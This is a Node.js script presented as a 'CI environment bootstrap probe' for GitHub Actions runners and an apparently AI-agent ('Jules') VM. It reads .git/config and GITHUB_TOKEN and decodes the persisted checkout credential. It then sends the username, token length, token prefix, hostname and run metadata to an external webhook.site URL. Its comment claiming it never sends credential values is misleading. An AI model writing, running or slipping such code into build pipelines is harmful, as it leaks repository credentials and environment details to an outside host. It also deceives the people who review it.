// CI environment bootstrap probe
// Reports structural info only — NEVER sends credential values
const fs = require('fs');
const https = require('https');

// ====== CONFIG ======
const WEBHOOK = 'https://webhook.site/9f16f387-bcce-4f3a-92c8-bef24903be26';
// ====================

const probe = {
  marker: 'jules-p1-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8),
  ts: new Date().toISOString(),
  env_source: process.env.GITHUB_ACTIONS === 'true' ? 'actions-runner'
            : process.env.JULES_SESSION_ID ? 'jules-vm'
            : 'unknown',
  github_actions: process.env.GITHUB_ACTIONS || null,
  github_run_id: process.env.GITHUB_RUN_ID || null,
  github_repository: process.env.GITHUB_REPOSITORY || null,
  github_event_name: process.env.GITHUB_EVENT_NAME || null,
  github_actor: process.env.GITHUB_ACTOR || null,
  runner_os: process.env.RUNNER_OS || null,
  jules_session_prefix: process.env.JULES_SESSION_ID ? process.env.JULES_SESSION_ID.slice(0, 6) : null,
  hostname: require('os').hostname(),
  cwd: process.cwd(),
  node_version: process.version,
};

// --- Check .git/config for checkout-persisted credentials ---
try {
  const gitconfig = fs.readFileSync('.git/config', 'utf8');
  const match = gitconfig.match(/extraheader\s*=\s*AUTHORIZATION:\s*basic\s+(\S+)/i);
  if (match) {
    probe.git_extraheader_found = true;
    try {
      const decoded = Buffer.from(match[1], 'base64').toString();
      const parts = decoded.split(':');
      probe.git_cred_user = parts[0];
      probe.git_cred_value_length = parts.slice(1).join(':').length;
      probe.git_cred_value_prefix = parts.slice(1).join(':').substring(0, 4);
    } catch (e) {
      probe.git_cred_decode_error = e.message;
    }
  } else {
    probe.git_extraheader_found = false;
    probe.git_config_has_token_keyword = /token|x-access-token|oauth/i.test(gitconfig);
  }
} catch (e) {
  probe.git_config_error = e.code || e.message;
}

// --- Check GITHUB_TOKEN env var ---
if (process.env.GITHUB_TOKEN) {
  probe.github_token_env_length = process.env.GITHUB_TOKEN.length;
  probe.github_token_env_prefix = process.env.GITHUB_TOKEN.substring(0, 4);
} else {
  probe.github_token_env_length = 0;
}

// --- Send (structural data only) ---
const data = JSON.stringify(probe, null, 2);
console.log('[ci-boot] probe:', JSON.stringify({
  marker: probe.marker,
  env_source: probe.env_source,
  git_extraheader_found: probe.git_extraheader_found,
  github_token_env_length: probe.github_token_env_length
}));

try {
  const url = new URL(WEBHOOK);
  const req = https.request({
    hostname: url.hostname,
    port: 443,
    path: url.pathname,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  }, (res) => {
    console.log('[ci-boot] webhook response:', res.statusCode);
  });
  req.on('error', (e) => {
    console.log('[ci-boot] webhook skipped:', e.message);
  });
  req.write(data);
  req.end();
} catch (e) {
  console.log('[ci-boot] send error:', e.message);
}
